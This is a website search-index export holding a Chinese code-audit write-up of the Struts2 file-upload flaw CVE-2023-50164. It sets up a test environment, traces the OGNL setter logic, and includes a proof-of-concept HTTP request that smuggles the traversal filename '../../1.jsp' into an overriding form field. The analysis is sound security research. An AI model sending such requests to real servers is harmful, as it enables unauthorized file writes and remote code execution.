[{"id":0,"href":"/docs/code-audit/","title":"Code Audit","section":"Docs","content":"title: 代码审计 一些代码审计、漏洞复现的记录\n"},{"id":1,"href":"/docs/code-audit/TestImg/TestImg/","title":"Test Img","section":"Code Audit","content":" "},{"id":2,"href":"/docs/","title":"Docs","section":":(","content":""},{"id":3,"href":"/docs/code-audit/Struts2-Upload-RCE/","title":"Struts Upload RCE (CVE-2023-50164)","section":"Code Audit","content":"CVE-2023-50164、S2-066，在Struts2的文件上传FileUploadInterceptor 处理过程中，为了方便用户会自动将上传的文件、文件名、参数等通过setter方式赋值给用户的逻辑，而这部分可以通过用户传递的文件名参数、覆盖Strust2自动设置的文件名的方式来绕过Struts2的文件名限制，进行目录穿越进而达到RCE的效果。\nAn attacker can manipulate file upload params to enable paths traversal and under some circumstances this can lead to uploading a malicious file which can be used to perform Remote Code Execution.\nhttps://cwiki.apache.org/confluence/display/WW/S2-066\n影响版本：\nStruts 2.0.0 - Struts 2.3.37 Struts 2.5.0 - Struts 2.5.32 Struts 6.0.0 - Struts 6.3.0 环境搭建 # Struts2 配置文件，定义了路径、处理方法、前端页面\n\u0026lt;!DOCTYPE struts PUBLIC \u0026#34;-//Apache Software Foundation//DTD Struts Configuration 6.0//EN\u0026#34; \u0026#34;https://struts.apache.org/dtds/struts-6.0.dtd\u0026#34;\u0026gt; \u0026lt;struts\u0026gt; \u0026lt;package name=\u0026#34;fileupload\u0026#34; extends=\u0026#34;struts-default\u0026#34; namespace=\u0026#34;/fileupload\u0026#34;\u0026gt; \u0026lt;action name=\u0026#34;doUpload\u0026#34; class=\u0026#34;org.apache.struts2.showcase.fileupload.FileUploadAction\u0026#34; method=\u0026#34;upload\u0026#34;\u0026gt; \u0026lt;result name=\u0026#34;input\u0026#34;\u0026gt;/WEB-INF/fileupload/upload.jsp\u0026lt;/result\u0026gt; \u0026lt;result\u0026gt;/WEB-INF/fileupload/upload-success.jsp\u0026lt;/result\u0026gt; \u0026lt;/action\u0026gt; \u0026lt;/package\u0026gt; \u0026lt;/struts\u0026gt; 前端jsp ，注意\u0026lt;s:file name=\u0026quot;upload\u0026quot; label=\u0026quot;File\u0026quot;/\u0026gt; 表示字段名是upload\n\u0026lt;%@ taglib prefix=\u0026#34;s\u0026#34; uri=\u0026#34;/struts-tags\u0026#34; %\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Struts2 Showcase - Fileupload sample\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div class=\u0026#34;page-header\u0026#34;\u0026gt; \u0026lt;h1\u0026gt;Fileupload sample\u0026lt;/h1\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;container-fluid\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;row\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;col-md-12\u0026#34;\u0026gt; \u0026lt;s:actionerror cssClass=\u0026#34;alert alert-error\u0026#34;/\u0026gt; \u0026lt;s:fielderror cssClass=\u0026#34;alert alert-error\u0026#34;/\u0026gt; \u0026lt;s:form action=\u0026#34;doUpload\u0026#34; method=\u0026#34;POST\u0026#34; enctype=\u0026#34;multipart/form-data\u0026#34;\u0026gt; \u0026lt;s:file name=\u0026#34;upload\u0026#34; label=\u0026#34;File\u0026#34;/\u0026gt; \u0026lt;s:textfield name=\u0026#34;caption\u0026#34; label=\u0026#34;Caption\u0026#34;/\u0026gt; \u0026lt;s:submit cssClass=\u0026#34;btn btn-primary\u0026#34;/\u0026gt; \u0026lt;/s:form\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 业务处理逻辑，Struts2会自动将上传的文件传递给下面的upload字段，文件名赋值给fileName字段等。\npackage org.apache.struts2.showcase.fileupload; import com.opensymphony.xwork2.ActionSupport; import org.apache.commons.io.FileUtils; import org.apache.struts2.ServletActionContext; import java.io.File; /** * Show case File Upload example\u0026#39;s action. \u0026lt;code\u0026gt;FileUploadAction\u0026lt;/code\u0026gt; */ public class FileUploadAction extends ActionSupport { private static final long serialVersionUID = 5156288255337069381L; private String contentType; private File upload; private String fileName; private String caption; public String input() throws Exception { return SUCCESS; } public String upload() throws Exception { String path = ServletActionContext.getServletContext().getRealPath(\u0026#34;/\u0026#34;)+\u0026#34;upload\u0026#34;; System.out.println(\u0026#34;this.getUploadFileName(): \u0026#34; + this.getUploadFileName()); System.out.println(\u0026#34;upload path: \u0026#34; + path); String realPath = path + File.separator + this.getUploadFileName(); try { FileUtils.copyFile(upload, new File(realPath)); } catch (Exception e) { e.printStackTrace(); } return SUCCESS; } // since we are using \u0026lt;s:file name=\u0026#34;upload\u0026#34; .../\u0026gt; the file name will be // obtained through getter/setter of \u0026lt;file-tag-name\u0026gt;FileName public String getUploadFileName() { return fileName; } public void setUploadFileName(String fileName) { this.fileName = fileName; } // since we are using \u0026lt;s:file name=\u0026#34;upload\u0026#34; ... /\u0026gt; the content type will be // obtained through getter/setter of \u0026lt;file-tag-name\u0026gt;ContentType public String getUploadContentType() { return contentType; } public void setUploadContentType(String contentType) { this.contentType = contentType; } // since we are using \u0026lt;s:file name=\u0026#34;upload\u0026#34; ... /\u0026gt; the File itself will be // obtained through getter/setter of \u0026lt;file-tag-name\u0026gt; public File getUpload() { return upload; } public void setUpload(File upload) { this.upload = upload; } public String getCaption() { return caption; } public void setCaption(String caption) { this.caption = caption; } public long getUploadSize() { if (upload != null) { return upload.length(); } else { return 0; } } } POC及利用条件 # POC：\n注意 uploadFileName 这是上面的代码中由Strust2自动赋值过来的参数，下面通过手动传递进行覆盖\nPOST /struts2_showcase_war/fileupload/doUpload.action HTTP/1.1 Host: localhost:8080 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:120.0) Gecko/20100101 Firefox/120.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br Content-Type: multipart/form-data; boundary=---------------------------21972861871679732823856174094 Content-Length: 472 Origin: http://localhost:8080 Connection: close Referer: http://localhost:8080/struts2_showcase_war/fileupload/upload.action Cookie: JSESSIONID=5B04BC8FA13D0717C172C4AF150FB093 Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: same-origin Sec-Fetch-User: ?1 -----------------------------21972861871679732823856174094 Content-Disposition: form-data; name=\u0026#34;Upload\u0026#34;; filename=\u0026#34;11111.txt\u0026#34; Content-Type: text/plain 1111 -----------------------------21972861871679732823856174094 Content-Disposition: form-data; name=\u0026#34;uploadFileName\u0026#34; ../../1.jsp -----------------------------21972861871679732823856174094 Content-Disposition: form-data; name=\u0026#34;caption\u0026#34; 3333 -----------------------------21972861871679732823856174094-- 利用条件：\n首先要知道 文件上传代码中的文件名字段名， 这里上传名是 upload （由jsp中定义），文件名字段按照习惯可能会是UploadFileName （upload + FileName） ，如果不是则无法覆盖\nContent-Disposition: form-data; name=\u0026ldquo;Upload\u0026rdquo;; filename=\u0026ldquo;11111.txt\u0026rdquo;\nContent-Disposition: form-data; name=\u0026ldquo;uploadFileName\u0026rdquo;\n这个洞的利用点就在通过自己传的文件名覆盖掉Strust2自动赋值的文件名，所以如果原来程序逻辑本来就是获取文件名，根据后缀判断，那这个洞就没法利用了\n这么看，其实没有想象的那么严重？\n漏洞分析 # 这个补丁这么找来的\nhttps://github.com/apache/struts/commit/162e29fee9136f4bfd9b2376da2cbf590f9ea163\norg.apache.struts2.interceptor.FileUploadInterceptor#intercept 这里主要提取用户的数据包中的文件、文件名、文件类型字段\n注意，这里的文件名会被安全处理\nString[] fileName = multiWrapper.getFileNames(inputName); org.apache.struts2.dispatcher.multipart.AbstractMultiPartRequest#getCanonicalName 会将 / 和\\的目录遍历payload过滤掉\nprotected String getCanonicalName(String originalFileName) { int forwardSlash = originalFileName.lastIndexOf(47); int backwardSlash = originalFileName.lastIndexOf(92); String fileName; if (forwardSlash != -1 \u0026amp;\u0026amp; forwardSlash \u0026gt; backwardSlash) { fileName = originalFileName.substring(forwardSlash + 1); } else { fileName = originalFileName.substring(backwardSlash + 1); } return fileName; } 再回到主逻辑，com.opensymphony.xwork2.interceptor.ParametersInterceptor#doIntercept 的parameters 会收到所有传入的参数并调用this.setParameters将这些参数通过用户的setter方法传递过去\n可以注意到上图中有两个变量名：UploadFileName 和 uploadFileName 有不同的值，但都会调用setUploadFileName 这个方法，也就是会执行两次setUploadFileName ，小写开头的uploadFileName 会替换掉由Struts2自动生成的大写UploadFileName的值，进而目录穿越，这就是漏洞点\n示例中的upload类（ org.apache.struts2.showcase.fileupload.FileUploadAction）：\npublic void setUpload(File upload)\npublic void setUploadFileName(String fileName)\npublic void setUploadContentType(String contentType)\n再来看为何 UploadFileName 和 uploadFileName 两个都会执行 setUploadFileName 跟进 this.setParameters， 可以看到通过 newStack.setParameter 进行设置参数，继续跟进\n在 org.apache.struts2.showcase.fileupload.FileUploadAction#setUpload打个断点 ，回溯\nsetUpload:89, FileUploadAction (org.apache.struts2.showcase.fileupload) invokeVirtual:-1, DirectMethodHandle$Holder (java.lang.invoke) invoke:-1, LambdaForm$MH/0x0000000800cc2000 (java.lang.invoke) invokeExact_MT:-1, Invokers$Holder (java.lang.invoke) invokeImpl:155, DirectMethodHandleAccessor (jdk.internal.reflect) invoke:104, DirectMethodHandleAccessor (jdk.internal.reflect) invoke:577, Method (java.lang.reflect) invokeMethodInsideSandbox:1245, OgnlRuntime (ognl) invokeMethod:1230, OgnlRuntime (ognl) callAppropriateMethod:1958, OgnlRuntime (ognl) setMethodValue:2196, OgnlRuntime (ognl) setPossibleProperty:98, ObjectPropertyAccessor (ognl) setProperty:175, ObjectPropertyAccessor (ognl) setProperty:42, ObjectAccessor (com.opensymphony.xwork2.ognl.accessor) setProperty:3359, OgnlRuntime (ognl) setProperty:84, CompoundRootAccessor (com.opensymphony.xwork2.ognl.accessor) setProperty:3359, OgnlRuntime (ognl) setValueBody:134, ASTProperty (ognl) evaluateSetValueBody:220, SimpleNode (ognl) setValue:308, SimpleNode (ognl) setValue:829, Ognl (ognl) lambda$setValue$2:550, OgnlUtil (com.opensymphony.xwork2.ognl) execute:-1, OgnlUtil$$Lambda$383/0x0000000800fa97a0 (com.opensymphony.xwork2.ognl) compileAndExecute:625, OgnlUtil (com.opensymphony.xwork2.ognl) setValue:543, OgnlUtil (com.opensymphony.xwork2.ognl) trySetValue:195, OgnlValueStack (com.opensymphony.xwork2.ognl) setValue:182, OgnlValueStack (com.opensymphony.xwork2.ognl) setParameter:166, OgnlValueStack (com.opensymphony.xwork2.ognl) setParameters:228, ParametersInterceptor (com.opensymphony.xwork2.interceptor) doIntercept:144, ParametersInterceptor (com.opensymphony.xwork2.interceptor) ... 着重看下ognl.OgnlRuntime#setMethodValue(ognl.OgnlContext, java.lang.Object, java.lang.String, java.lang.Object, boolean) 如何获取方法的，为什么uploadFileName 会调用setUploadFileName方法\nognl.OgnlRuntime#_getSetMethod 中的逻辑主要是获取属性的所有方法，根据参数的个数是否为1 判断是否为set方法\nognl.OgnlRuntime#getDeclaredMethods public static List getDeclaredMethods(Class targetClass, String propertyName, boolean findSets) { List result = null; ClassCache cache = _declaredMethods[findSets ? 0 : 1]; Map propertyCache = (Map) cache.get(targetClass); if ((propertyCache == null) || ((result = (List) propertyCache.get(propertyName)) == null)) { synchronized (cache) { propertyCache = (Map) cache.get(targetClass); if ((propertyCache == null) || ((result = (List) propertyCache.get(propertyName)) == null)) { // 对属性名进行处理 String baseName = capitalizeBeanPropertyName(propertyName); result = new ArrayList(); // 匹配符合属性名的方法 collectAccessors(targetClass, baseName, result, findSets); if (propertyCache == null) { cache.put(targetClass, propertyCache = new HashMap(101)); } propertyCache.put(propertyName, result.isEmpty() ? NotFoundList : result); return result.isEmpty() ? null : result; } } } return (result == NotFoundList) ? null : result; } ognl.OgnlRuntime#capitalizeBeanPropertyName 主要是将属性名返回格式处理成 首字母大写， 用来组成 setter方法，比如setUpload\nprivate static String capitalizeBeanPropertyName(String propertyName) { if (propertyName.length() == 1) { return propertyName.toUpperCase(); } // 一些特殊的方法调用： // don\u0026#39;t capitalize getters/setters if (propertyName.startsWith(GET_PREFIX) \u0026amp;\u0026amp; propertyName.endsWith(\u0026#34;()\u0026#34;)) { if (Character.isUpperCase(propertyName.substring(3,4).charAt(0))) { return propertyName; } } if (propertyName.startsWith(SET_PREFIX) \u0026amp;\u0026amp; propertyName.endsWith(\u0026#34;)\u0026#34;)) { if (Character.isUpperCase(propertyName.substring(3,4).charAt(0))) { return propertyName; } } if (propertyName.startsWith(IS_PREFIX) \u0026amp;\u0026amp; propertyName.endsWith(\u0026#34;()\u0026#34;)) { if (Character.isUpperCase(propertyName.substring(2,3).charAt(0))) { return propertyName; } } char first = propertyName.charAt(0); char second = propertyName.charAt(1); if (Character.isLowerCase(first) \u0026amp;\u0026amp; Character.isUpperCase(second)) { return propertyName; } else { // 将 首字母大写 返回，用来后面拼接 set 匹配方法 char[] chars = propertyName.toCharArray(); chars[0] = Character.toUpperCase(chars[0]); return new String(chars); } } 将恶意参数 uploadFileName 转成UploadFileName\n遍历方法，取出匹配的方法\nprivate static void collectAccessors(Class c, String baseName, List result, boolean findSets) { Method[] methods; try { methods = c.getDeclaredMethods(); } catch (SecurityException ignored) { methods = c.getMethods(); } for (int i = 0; i \u0026lt; methods.length; i++) { if (c.isInterface()) { if (isDefaultMethod(methods[i]) || isNonDefaultPublicInterfaceMethod(methods[i])) { addIfAccessor(result, methods[i], baseName, findSets); } continue; } // ... addIfAccessor(result, methods[i], baseName, findSets); } } 取出属性名相关的 is 、set、get方法 ，主要是通过长度来添加方法\n// private static final String SET_PREFIX = \u0026#34;set\u0026#34;; // private static final String GET_PREFIX = \u0026#34;get\u0026#34;; // pprivate static final String IS_PREFIX = \u0026#34;is\u0026#34;; private static void addIfAccessor(List result, Method method, String baseName, boolean findSets) { final String ms = method.getName(); // 必须以属性名结尾 if (ms.endsWith(baseName)) { boolean isSet = false, isIs = false; if ((isSet = ms.startsWith(SET_PREFIX)) || ms.startsWith(GET_PREFIX) || (isIs = ms.startsWith(IS_PREFIX))) { int prefixLength = (isIs ? 2 : 3); if (isSet == findSets) { // 并且长度一样 if (baseName.length() == (ms.length() - prefixLength)) { result.add(method); } } } } } 从上面看，如果是小写的uploadFileName方法正好能通过capitalizeBeanPropertyName 将首字母大写，而被addIfAccessor匹配添加进列表执行。\n而在这个过程中，先添加进去的方法会被后进的方法覆盖执行，所以利用也取决于添加顺序和排序顺序：\ncom.opensymphony.xwork2.interceptor.ParametersInterceptor#setParameters\nprotected void setParameters(Object action, ValueStack stack, HttpParameters parameters) { HttpParameters params; TreeMap acceptableParameters; if (this.ordered) { params = HttpParameters.create().withComparator(this.getOrderedComparator()).withParent(parameters).build(); acceptableParameters = new TreeMap(this.getOrderedComparator()); } else { params = HttpParameters.create().withParent(parameters).build(); acceptableParameters = new TreeMap(); } 还有没有其他的 # 总结一下，默认在 org.apache.struts2.interceptor.FileUploadInterceptor#intercept中的文件名处理String[] fileName = multiWrapper.getFileNames(inputName);会调用org.apache.struts2.dispatcher.multipart.AbstractMultiPartRequest#getCanonicalName将目录穿越的参数过滤掉，而因为所有的参数都会流入com.opensymphony.xwork2.interceptor.ParametersInterceptor#setParameters 进行赋值，用户自己传上来的文件名参数不会经过getCanonicalName过滤操作，从而进行绕过了。\n所以，还有没有在拦截器中过滤的参数，可以通过ParametersInterceptor#setParameters重新设置上？\n"}]